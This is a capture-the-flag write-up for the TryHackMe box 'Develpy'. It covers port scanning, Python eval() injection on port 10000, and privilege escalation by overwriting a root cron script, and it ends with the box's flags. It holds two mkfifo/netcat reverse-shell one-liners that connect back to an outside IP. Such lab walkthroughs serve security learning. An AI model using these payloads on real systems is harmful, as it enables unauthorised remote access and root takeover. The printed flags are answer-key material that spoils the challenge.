# Develpy Writeup

Today I am going to solve *Develpy* box on *THM* 
## Step 1:

Lets first find out about open ports

```
PORT      STATE SERVICE           REASON  VERSION
22/tcp    open  ssh               syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeAB1tAGCfeGkiBXodMGeCc6prI2xaWz/fNRhwusVEujBTQ1BdY3BqPHNf1JLGhqts1anfY9ydt0N1cdAEv3L16vH2cis+34jyek3d+TVp+oBLztNWY5Yfcv/3uRcy5yyZsKjMz+wyribpEFlbpvscrVYfI2Crtm5CgcaSwqDDtc1doeABJ9t3iSv+7MKBdWJ9N3xd/oTfI0fEOdIp8M568A1/CJEQINFPVu1txC/HTiY4jmVkNf6+JyJfFqshRMpFq2YmUi6GulwzWQONmbTyxqrZg2y+y2q1AuFeritRg9vvkBInW0x18FS8KLdy5ohoXgeoWsznpR1J/BzkNfap
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDGGFFv4aQm/+j6R2Vsg96zpBowtu0/pkUxksqjTqKhAFtHla6LE0BRJtSYgmm8+ItlKHjJX8DNYylnNDG+Ol/U=
|   256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbypBoQ33EbivAc05LqKzxLsJrTgXOrXG7qG/RoO30K
10000/tcp open  snet-sensor-mgmt? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:

```


## Step 2:

Lets try to connect to port 10000 by *netcat*

```
nc <I.P> 10000
```
![](https://i.imgur.com/JWVyVI7.png)

On entering different inputs like *3+1* it showing result of 4 , that means our port is running a python script using *eval()*
We can try to input malacious script from [revshell](https://www.revshells.com/) 

![](https://i.imgur.com/VxoVTNQ.png)

lets input in form of python script

```__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.67.68 9001 >/tmp/f')```

![](https://i.imgur.com/8mMQZUh.png)


lets connect to it by *nc -lnvp 9001*

![](https://i.imgur.com/ViGnVGE.png)

## Step 3:

we can directly cat user.txt file

![](https://i.imgur.com/G1Kexbd.png)


### user.txt : cf85ff769cfaaa721758949bf870b019

## Step 4:

Lets go and see which cronjobs are running on system

```
king@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
```

In *kings* directory *root* is running a script "root.sh" ,
and we can read root.sh , So we can perform privilage escalation simply by removing present *root.sh* and placing our new *root.sh* , with reverse shell .

```
king@ubuntu:~$ rm root.sh
rm root.sh
king@ubuntu:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.67.68 9005 >/tmp/f' > root.sh
</f|sh -i 2>&1|nc 10.4.67.68 9005 >/tmp/f' > root.sh                         
king@ubuntu:~$ 

```

Finally We get ,

![](https://i.imgur.com/3EvJ20v.png)


Lets open root.txt

```
# cat /root/root.txt
9c37646777a53910a347f387dce025ec

```

### root.txt : 9c37646777a53910a347f387dce025ec




#### Thanks to everyone for reading my Writeup on *Develpy*

